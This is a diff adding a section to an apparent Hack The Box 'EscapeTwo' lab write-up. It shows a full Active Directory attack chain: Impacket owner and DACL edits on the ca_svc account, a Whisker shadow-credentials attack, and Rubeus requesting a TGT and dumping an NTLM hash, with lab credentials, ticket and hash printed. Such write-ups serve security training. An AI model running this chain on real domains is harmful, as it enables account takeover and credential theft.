@@ -257,6 +257,108 @@ After uploading and ingesting the data, I found that the `ryan` user has `WriteO
 
 This account is a member of the "Cert Publishers" group, 
 ![[Pasted image 20250615203401.png]]
+```powershell
+impacket-owneredit -action write -new-owner ryan -target ca_svc 10.10.11.51/ryan:WqSZAF6CysDQbGb3   
+Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
+
+[*] Current owner information below
+[*] - SID: S-1-5-21-548670397-972687484-3496335370-512
+[*] - sAMAccountName: Domain Admins
+[*] - distinguishedName: CN=Domain Admins,CN=Users,DC=sequel,DC=htb
+[*] OwnerSid modified successfully!
+                                                                                                                                                                                             
+wither@kali:~/CTF/HTB/EscapeTwo/files$ impacket-dacledit -action write -target ca_svc -principal ryan DC01.SEQUEL.HTB/ryan:WqSZAF6CysDQbGb3
+Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
+
+[*] DACL backed up to dacledit-20250615-223056.bak
+[*] DACL modified successfully!
+```
+
+
+```powershell
+C:\Users\ryan\Documents> .\Whisker.exe add /target:ca_svc
+[*] No path was provided. The certificate will be printed as a Base64 blob
+[*] No pass was provided. The certificate will be stored with the password 3emBDm8wUGJQagmv
+[*] Searching for the target account
+[*] Target user found: CN=Certification Authority,CN=Users,DC=sequel,DC=htb
+[*] Generating certificate
+[*] Certificate generaged
+[*] Generating KeyCredential
+[*] KeyCredential generated with DeviceID 04b442ce-f557-4730-aead-23223cb85976
+[*] Updating the msDS-KeyCredentialLink attribute of the target object
+[+] Updated the msDS-KeyCredentialLink attribute of the target object
+[*] You can now run Rubeus with the following syntax:
+
+Rubeus.exe asktgt /user:ca_svc /certificate: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 /password:"3emBDm8wUGJQagmv" /domain:sequel.htb /dc:DC01.sequel.htb /getcredentials /show
+*Evil-WinRM* PS C:\Users\ryan\Documents> .\Rubeus.exe asktgt /user:ca_svc /certificate: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 /password:"3emBDm8wUGJQagmv" /domain:sequel.htb /dc:DC01.sequel.htb /getcredentials /show
+
+   ______        _
+  (_____ \      | |
+   _____) )_   _| |__  _____ _   _  ___
+  |  __  /| | | |  _ \| ___ | | | |/___)
+  | |  \ \| |_| | |_) ) ____| |_| |___ |
+  |_|   |_|____/|____/|_____)____/(___/
+
+  v2.2.3
+
+[*] Action: Ask TGT
+
+[*] Using PKINIT with etype rc4_hmac and subject: CN=ca_svc
+[*] Building AS-REQ (w/ PKINIT preauth) for: 'sequel.htb\ca_svc'
+[*] Using domain controller: ::1:88
+[+] TGT request successful!
+[*] base64(ticket.kirbi):
+
+      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
+
+  ServiceName              :  krbtgt/sequel.htb
+  ServiceRealm             :  SEQUEL.HTB
+  UserName                 :  ca_svc (NT_PRINCIPAL)
+  UserRealm                :  SEQUEL.HTB
+  StartTime                :  6/15/2025 2:31:44 PM
+  EndTime                  :  6/16/2025 12:31:44 AM
+  RenewTill                :  6/22/2025 2:31:44 PM
+  Flags                    :  name_canonicalize, pre_authent, initial, renewable, forwardable
+  KeyType                  :  rc4_hmac
+  Base64(key)              :  PIVolX8B4YWa8kE+Qqth8Q==
+  ASREP (key)              :  F76ABFFAA8AAE4667B1874B012E5B1E1
+
+[*] Getting credentials using U2U
+
+  CredentialInfo         :
+    Version              : 0
+    EncryptionType       : rc4_hmac
+    CredentialData       :
+      CredentialCount    : 1
+       NTLM              : 3B181B914E7A9D5508EA1E20BC2B7FCE
+```
+
 
 
 ## Enumeration
